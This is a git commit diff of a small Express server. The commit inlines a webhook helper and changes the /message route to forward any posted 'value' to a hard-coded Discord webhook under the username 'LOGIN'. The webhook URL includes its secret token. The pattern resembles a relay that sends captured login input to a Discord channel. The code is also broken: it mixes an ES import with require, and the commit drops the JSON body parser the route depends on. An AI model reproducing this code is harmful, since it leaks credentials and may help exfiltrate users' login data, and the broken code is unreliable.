840bef2abf06e2051ed893dda4a531e28faa9c22
Rexonnect <rexonnect@protonmail.com>
2023-09-07 18:21:04 +1000

    removed webhook modual

--- index.js
+++ index.js
@@ -1,27 +1,53 @@
 const express = require('express')
 const md5hash = require('./middleware/md5hash');
-const sendWebhookMessage = require('./middleware/webhook');
 const sanitizeInput = require('./middleware/sanitizeInput');
 import fetch from 'node-fetch';
 
 const app = express()
 
+async function sendWebhookMessage(message, webhook) {
+  const { default: fetch } = await import('node-fetch');
+  const webhookUrl = webhook;
+
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(message)
+    });
+
+    if (response.ok) {
+      console.log('Message sent to the webhook successfully.');
+    } else {
+      console.error('Error sending message to the webhook:', response.status);
+    }
+  } catch (error) {
+    console.error('Error sending message to the webhook:', error);
+  }
+}
 
 app.all('/', (req, res) => {
     console.log("Just got a request!")
     res.send('Yo!')
 })
 
-app.use(express.json()); // Assuming you're using JSON requests
 
 // Apply the md5Middleware to a specific POST route
 app.post('/hash', md5hash);
 
 app.post('/message', async (req, res) => {
-  const { message } = req.body;
+  const { value } = req.body;
 
   const webhookUrl = "https://discord.com/api/webhooks/1148881222261547018/eLk0DyWLT9b0GpWUQIosRwPFEfg15LZr5py5BYICP5WpNyTgJRKZXpuFd5EOXCpdmD8H";
-  sendWebhookMessage(message); // Use the correct function name
+
+  const message = {
+    username: "LOGIN",
+    avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583446952935424/ug-mkt.png",
+    content: value
+  };
+  await sendWebhookMessage(message, webhookUrl);
   console.log(message + webhookUrl);
   
 });
